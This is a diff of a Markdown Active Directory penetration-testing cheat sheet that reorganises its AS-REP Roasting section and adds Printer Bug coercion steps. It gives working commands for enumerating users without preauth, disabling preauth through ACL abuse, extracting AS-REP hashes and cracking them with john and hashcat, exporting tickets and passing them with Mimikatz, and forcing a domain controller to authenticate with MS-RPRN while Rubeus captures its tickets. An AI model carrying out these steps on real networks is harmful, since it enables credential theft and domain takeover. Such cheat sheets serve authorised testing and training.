@@ -129,51 +129,13 @@ To prevent from kerberoasting attacks we have the following recommendations:
 * Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management)
 * Try to not run a service as a Domain Admin account.
 
-
-## AS-REP Roasting
-
-If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.
-
-### Users with No-Preauth set
-
-We need to enumerate accounts with Kerberos Preauth disabled:
-
-* PowerView:
-```powershell
-Get-DomainUser -PreauthNotRequired -Verbose
-```
-
-* ADModule:
-```powershell
-Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
-```
-
-> **Note**: With `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
-> 
-> `Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose`
-
-### Cracking the tickets
-
-We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:
-
-```powershell
-Import-Module ASREPRoast.ps1
-Get-ASREPHash -UserName user01 -Verbose
-```
-After getting the ticket we can crack it with `john` or `hashcat`:
-
-```
-john user01.ticket --wordlist=wordlist.txt
-hashcat -a 0 -m 18200 user01.ticket wordlist.txt
-```
-
-## Set SPN
+### Set SPN
 
 With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.
 
 We can enumerate the permissions for a group on ACLs:
 
-* PowerView (dev):
+* PowerView:
 ```powershell
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 ```
@@ -213,6 +175,47 @@ And we can export the tickets to the disk:
 Inovoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.
+
+## AS-REP Roasting
+
+If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.
+
+### Users with No-Preauth set
+
+We need to enumerate accounts with Kerberos Preauth disabled:
+
+* PowerView (dev):
+```powershell
+Get-DomainUser -PreauthNotRequired -Verbose
+```
+
+* ADModule:
+```powershell
+Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
+```
+
+### Disable PreAuth
+
+A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
+
+* PowerView (dev):
+```powershell
+Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose
+```
+### Cracking the tickets
+
+We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:
+
+```powershell
+Import-Module ASREPRoast.ps1
+Get-ASREPHash -UserName user01 -Verbose
+```
+After getting the ticket we can crack it with `john` or `hashcat`:
+
+```
+john user01.ticket --wordlist=wordlist.txt
+hashcat -a 0 -m 18200 user01.ticket wordlist.txt
+```
 
 # Kerberos Delegation
 
@@ -260,6 +263,22 @@ If we find a interesting ticket, it could be reused using _PassTheTicket_:
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+```
+
+### Printer Bug
+
+We can abuse the printer bug if we don't want to wait for a Domain Admin to connect to the server where Unconstrained Delegation is enabled.
+
+We can start listenting for new tickets with Rubeus on the server which have Unconstrained Delegation enabled.
+
+```
+.\Rubeus.exe monitor /inverval:5 /nowrap
+```
+
+With the printer bug we can force the Domain Controller to connect to any server.
+
+```
+.\MS-RPRN.exe \\dc01.corp.local \\udeleg.corp.local
 ```
 
 ## Constrained Delegation
